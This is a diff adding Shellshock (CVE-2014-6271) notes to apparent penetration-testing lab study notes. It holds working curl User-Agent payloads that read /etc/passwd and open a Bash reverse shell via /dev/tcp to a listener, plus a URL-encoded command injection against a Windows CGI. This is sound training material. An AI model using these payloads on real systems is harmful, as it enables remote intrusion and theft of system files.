@@ -818,3 +818,33 @@ In case invalid character had been encountered, URL-encode the payload:
 ```
 http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
 ```
+
+## Attacking Common Gateway Interface (CGI) Applications - Shellshock
+CGI is essentially middleware between web servers, external databases, and information sources. CGI scripts and programs are kept in the `/CGI-bin` directory on a web server and can be written in C, C++, Java, PERL, etc.
+
+### Shellshock via CGI
+The Shellshock vulnerability ([CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)) is a security flaw in the Bash shell (GNU Bash up until version 4.3) that can be used to execute unintentional commands using environment variables. <br>
+Example:
+```
+env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
+```
+Bash will interpret the `y='() { :;};'` portion as a function definition for a variable `y`. The function does nothing but returns an exit code `0`, but when it is imported, it will execute the command `echo vulnerable-shellshock` if the version of Bash is vulnerable. This (or any other command, such as a reverse shell one-liner) will be run in the context of the web server user.
+#### Enumeration - Gobuster
+```
+gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
+```
+```
+curl -i http://10.129.204.231/cgi-bin/access.cgi
+```
+To check for the vulnerability, we can use a simple cURL command or use Burp Suite Repeater or Intruder to fuzz the user-agent field.
+```
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
+```
+If the vulnerability has been confirmed, set up a listener:
+```
+nc -lvnp 7777
+```
+Then:
+```
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
+```
